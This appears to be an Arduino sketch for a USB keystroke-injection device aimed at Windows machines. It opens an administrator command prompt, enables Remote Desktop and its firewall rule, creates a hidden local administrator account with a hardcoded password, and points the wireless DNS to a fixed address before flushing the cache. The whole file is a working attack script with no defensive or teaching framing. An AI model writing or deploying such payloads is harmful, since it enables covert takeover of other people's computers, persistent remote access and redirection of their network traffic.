
int flag=0;
void setup()
{
  pinMode(buttonPin, INPUT);  // Set the button as an input
  digitalWrite(buttonPin, HIGH); 
 Keyboard.begin(); // Pull the button high
}

void loop()
{
             
  if (flag==0) // if the button goes low
  {
    
    delay(2000);
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.releaseAll();
    delay(1500);
     //open cmd with admin priviledge
    Keyboard.print("cmd");
    delay(3000);
    Keyboard.press(KEY_RIGHT_CTRL);
    Keyboard.press(KEY_RIGHT_SHIFT);
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(5000);
    Keyboard.press(KEY_LEFT_ARROW);
    Keyboard.releaseAll();
    delay(3000);
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(2000);
    
    //enable remote desktop and add a firewall policy to allow RDP
    Keyboard.print("netsh advfirewall firewall set rule group=\"remote desktop\" new enable=Yes");
    delay(3000);
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(3000);
    Keyboard.print("reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f");
    delay(3000);
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(3000);
    
    //add user ['feroz' is the username and 'rash' is the password]
     Keyboard.print("net user /add feroz rash");
    delay(3000);
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(3000);
   
   //give the user admin priviledge
    Keyboard.print("net localgroup administrators feroz /add");
    delay(3000);
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(3000);
    
    //open netsh interface
    Keyboard.print("netsh");
    delay(3000);
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(3000);
    
    //changing DNS entry of wireless connection
    Keyboard.print("interface ip set dns \"Wireless Network Connection\" static 192.168.1.1");
    delay(3000);
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(3000);
    
    
    //exit from netsh
    Keyboard.print("exit");
    delay(3000);
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(3000);
    
    //flush DNS cache
    Keyboard.print("ipconfig /flushdns");
    delay(3000);
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(3000);
    
    //exit from c
   
    Keyboard.print("exit");
    delay(3000);
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(3000);
    
    flag=1; 
     
  }}
